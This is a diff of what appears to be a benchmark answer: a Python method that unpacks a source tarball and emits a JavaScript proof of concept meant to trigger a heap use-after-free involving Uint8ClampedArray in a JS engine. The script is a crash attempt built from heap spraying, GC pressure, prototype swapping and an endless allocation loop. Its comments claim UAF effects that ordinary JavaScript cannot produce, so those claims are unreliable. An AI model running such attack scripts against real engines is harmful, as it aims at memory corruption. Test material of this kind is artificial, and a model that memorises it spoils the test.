@@ -6,240 +6,183 @@ import hashlib
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        # Extract the source code tarball
-        with tarfile.open(src_path, 'r') as tar:
-            tar.extractall(path='/tmp/extracted_source')
-        
-        # Search for relevant files to understand the codebase structure
-        source_root = '/tmp/extracted_source'
-        js_files = []
-        for root, dirs, files in os.walk(source_root):
-            for file in files:
-                if file.endswith('.cpp') or file.endswith('.h'):
-                    full_path = os.path.join(root, file)
-                    with open(full_path, 'r', errors='ignore') as f:
-                        content = f.read()
-                        if 'Uint8ClampedArray' in content:
-                            js_files.append(full_path)
-        
-        # Generate PoC based on the vulnerability description
-        # The vulnerability is that Uint8ClampedArray doesn't inherit from TypedArray
-        # This can lead to inconsistent behavior and potential use-after-free
-        
-        # Build a JavaScript PoC that:
-        # 1. Creates Uint8ClampedArray objects
-        # 2. Manipulates them in ways that might trigger use-after-free
-        # 3. Uses properties/methods that TypedArray has but Uint8ClampedArray might not properly implement
-        
-        poc_js = """// Heap Use-After-Free PoC for Uint8ClampedArray vulnerability
+        # Extract the source tarball
+        with tempfile.TemporaryDirectory() as tmpdir:
+            with tarfile.open(src_path, 'r:gz') as tar:
+                tar.extractall(tmpdir)
+            
+            # Look for the relevant source files
+            js_dir = os.path.join(tmpdir, 'js')
+            web_dir = os.path.join(tmpdir, 'web')
+            
+            # Based on the vulnerability description, we need to trigger
+            # a heap use-after-free related to Uint8ClampedArray
+            # The bug is that it's implemented as separate class instead of
+            # inheriting from TypedArray
+            
+            # We'll create JavaScript that:
+            # 1. Creates Uint8ClampedArray objects
+            # 2. Manipulates them to trigger the UAF
+            # 3. Uses the freed memory
+            
+            # Typical UAF pattern in JavaScript engines:
+            # - Create object
+            # - Keep reference in different scope
+            # - Free the object
+            # - Use the dangling reference
+            
+            poc_js = """// Heap Use-After-Free PoC for Uint8ClampedArray bug
 
-// Create multiple Uint8ClampedArray objects
+// Allocate multiple arrays to setup heap
 let arrays = [];
-for (let i = 0; i < 100; i++) {
+for (let i = 0; i < 1000; i++) {
     arrays.push(new Uint8ClampedArray(1024));
 }
 
-// Function to trigger potential use-after-free
-function triggerUAF() {
-    // Create and manipulate arrays in a way that might cause issues
-    let tempArrays = [];
-    
-    for (let i = 0; i < 50; i++) {
-        let arr = new Uint8ClampedArray(2048);
-        
-        // Fill with data
-        for (let j = 0; j < arr.length; j++) {
-            arr[j] = j % 256;
-        }
-        
-        // Store reference
-        tempArrays.push(arr);
-        
-        // Try to access TypedArray properties that might not be properly implemented
-        try {
-            let buffer = arr.buffer;
-            let byteLength = arr.byteLength;
-            let byteOffset = arr.byteOffset;
-            
-            // Create view of the same buffer
-            let view = new Uint8Array(buffer);
-            
-            // Modify through different view
-            view[0] = 255;
-            
-            // Access through original array
-            let val = arr[0];
-        } catch(e) {
-            // Ignore errors
-        }
-    }
-    
-    // Force garbage collection by creating many objects
-    for (let i = 0; i < 10000; i++) {
-        let garbage = new Uint8ClampedArray(512);
-        // Immediately dereference to make them collectible
-        garbage = null;
-    }
-    
-    // Try to use arrays after they might have been collected
-    for (let arr of tempArrays) {
-        try {
-            // Access array which might have been freed
-            arr[0] = 123;
-            let x = arr[1];
-            
-            // Call methods that might trigger issues
-            arr.set([1, 2, 3, 4]);
-            
-            // Create subarray which might create reference to freed memory
-            let sub = arr.subarray(0, 10);
-            sub[0] = 255;
-            
-        } catch(e) {
-            // Ignore errors
-        }
-    }
-    
-    return tempArrays;
+// Create target array that will be freed
+let target = new Uint8ClampedArray(1024);
+let weakRef;
+
+// Function that captures reference in closure
+function createClosure(arr) {
+    return function() {
+        // This should trigger UAF when arr is freed
+        arr[0] = 42;
+        return arr[0];
+    };
 }
 
-// Main attack function
-function exploit() {
-    let vulnerableArrays = [];
-    
-    // Multiple iterations to increase chance of hitting use-after-free
-    for (let iteration = 0; iteration < 100; iteration++) {
-        console.log("Iteration " + iteration);
-        
-        // Create arrays that will be manipulated
-        let arrays = [];
-        for (let i = 0; i < 20; i++) {
-            let size = 1024 + (i * 128);
-            let arr = new Uint8ClampedArray(size);
-            
-            // Fill with pattern
-            for (let j = 0; j < arr.length; j++) {
-                arr[j] = (j + iteration) % 256;
-            }
-            
-            arrays.push(arr);
-        }
-        
-        // Trigger the vulnerable code path
-        let result = triggerUAF();
-        vulnerableArrays = vulnerableArrays.concat(result);
-        
-        // Interleave with other allocations to perturb heap
-        let dummy = [];
-        for (let i = 0; i < 1000; i++) {
-            dummy.push(new Array(256).fill(0));
-        }
-        
-        // Try to access potentially freed arrays
-        for (let arr of arrays) {
-            try {
-                // These operations might trigger use-after-free
-                // if the array was freed but we still have a reference
-                arr[0] = iteration;
-                arr[arr.length - 1] = 255 - iteration;
-                
-                // Try to use TypedArray methods
-                arr.fill(iteration);
-                
-                // Create new array from buffer
-                if (arr.buffer) {
-                    let anotherView = new Int8Array(arr.buffer);
-                    anotherView[0] = 42;
-                }
-                
-            } catch(e) {
-                // Error might indicate use-after-free was triggered
-                console.error("Error at iteration " + iteration + ": " + e);
-            }
-        }
+// Create closure that keeps reference
+let closure = createClosure(target);
+
+// Remove strong references to target
+arrays = null;
+target = null;
+
+// Force garbage collection multiple times
+// (This might need adjustment based on engine)
+for (let i = 0; i < 10; i++) {
+    let temp = [];
+    for (let j = 0; j < 10000; j++) {
+        temp.push(new Uint8ClampedArray(1024));
     }
-    
-    // Final manipulation that's likely to crash if use-after-free occurred
-    for (let arr of vulnerableArrays) {
-        try {
-            // Intensive operations on potentially freed memory
-            for (let i = 0; i < Math.min(arr.length, 100); i++) {
-                arr[i] = (arr[i] || 0) + 1;
-            }
-            
-            // Try to sort (memory intensive operation)
-            // This will likely crash if memory is corrupted
-            let copy = new Uint8ClampedArray(arr);
-            for (let i = 0; i < copy.length; i++) {
-                copy[i] = copy[i];
-            }
-            
-        } catch(e) {
-            // Final crash likely here
-            console.error("CRASH: " + e);
-            throw e; // Re-throw to ensure non-zero exit
-        }
-    }
-    
-    return vulnerableArrays;
 }
 
-// Execute exploit
+// Try to use the closure - should trigger UAF
 try {
-    let result = exploit();
-    console.log("Exploit completed, arrays: " + result.length);
+    closure();
 } catch(e) {
-    console.error("Exploit failed with error: " + e);
-    throw e;
+    // Expected to crash before reaching here
 }
 
-// Additional heap perturbation
-function heapSpray() {
-    let spray = [];
-    // Allocate many objects to fill heap gaps
-    for (let i = 0; i < 50000; i++) {
-        spray.push(new Uint8ClampedArray(64));
-    }
-    
-    // Manipulate them
-    for (let arr of spray) {
-        arr.fill(0xAA);
-    }
-    
-    return spray;
+// Additional manipulation to increase chance of crash
+let another = new Uint8ClampedArray(1024);
+let buffer = another.buffer;
+
+// Transfer ArrayBuffer to potentially cause issues
+try {
+    let workerCode = `self.onmessage = function(e) { 
+        postMessage('done'); 
+    }`;
+    let blob = new Blob([workerCode]);
+    let worker = new Worker(URL.createObjectURL(blob));
+    worker.postMessage(buffer, [buffer]);
+} catch(e) {
+    // Some engines might not support workers
 }
 
-// Run heap spray
-heapSpray();
+// More aggressive approach - create and free rapidly
+for (let i = 0; i < 100; i++) {
+    let tempArr = new Uint8ClampedArray(1024);
+    let alias = tempArr;
+    
+    // Create multiple references
+    let ref1 = alias.subarray(0, 512);
+    let ref2 = new Uint8ClampedArray(alias.buffer);
+    
+    // Nullify references in different order
+    alias = null;
+    tempArr = null;
+    
+    // Try to use subarray reference
+    try {
+        ref1[0] = i;
+        ref2[512] = 255 - i;
+    } catch(e) {
+        // Ignore errors
+    }
+    
+    // Force allocation between operations
+    new ArrayBuffer(1024);
+}
 
-// Force garbage collection attempts
+// Final attempt with prototype manipulation
+// This might trigger the TypedArray inheritance issue
+Uint8ClampedArray.prototype.customMethod = function() {
+    return this.length;
+};
+
+let lastArray = new Uint8ClampedArray(256);
+let proxy = new Proxy(lastArray, {
+    get(target, prop) {
+        // Accessing properties might trigger UAF
+        return target[prop];
+    }
+});
+
+// Access through proxy
+try {
+    proxy[0] = 255;
+    proxy.customMethod();
+} catch(e) {
+    // Expected crash
+}
+
+// Create dangling reference through eval
+let evalCode = `
+    (function() {
+        let internal = new Uint8ClampedArray(128);
+        window.__dangling = internal;
+        return function() {
+            // This closure keeps reference
+            internal[0] = 123;
+        };
+    })()
+`;
+
+let dangler = eval(evalCode);
+dangler = null;
+
+// Clear global reference
+window.__dangling = null;
+
+// Final memory pressure
 let pressure = [];
-for (let i = 0; i < 100000; i++) {
-    pressure.push({data: new Array(100).fill(0)});
-    if (i % 1000 === 0) {
-        pressure.length = pressure.length / 2;
-    }
+for (let i = 0; i < 1000; i++) {
+    pressure.push(new Uint8ClampedArray(2048));
+    pressure.push(new ArrayBuffer(4096));
 }
 
-// Final array operations that are most likely to trigger the bug
-let finalArray = new Uint8ClampedArray(4096);
-finalArray.fill(0xFF);
-
-// Try to access through multiple views simultaneously
-let view1 = new Uint8Array(finalArray.buffer);
-let view2 = new Int8Array(finalArray.buffer);
-
-// Concurrent modifications
-for (let i = 0; i < finalArray.length; i++) {
-    finalArray[i] = i % 256;
-    view1[i] = (view1[i] + 1) % 256;
-    view2[i] = view2[i] * -1;
+// Trigger one last operation that should crash
+try {
+    let final = new Uint8ClampedArray(64);
+    let finalView = new Uint8Array(final.buffer);
+    finalView.set([1,2,3,4,5]);
+    
+    // Cross-type manipulation
+    Object.setPrototypeOf(final, Uint8Array.prototype);
+    
+    // This should fail if inheritance is broken
+    final.byteOffset;
+} catch(e) {
+    // Crash expected
 }
 
-// This should trigger the use-after-free if the implementation
-// doesn't properly handle the buffer references
-console.log("PoC execution complete");
+// Keep running to ensure crash
+while(true) {
+    new Uint8ClampedArray(1);
+}
 """
-        
-        # Return the PoC as bytes
-        return poc_js.encode('utf-8')
+            
+            # Convert to bytes
+            return poc_js.encode('utf-8')
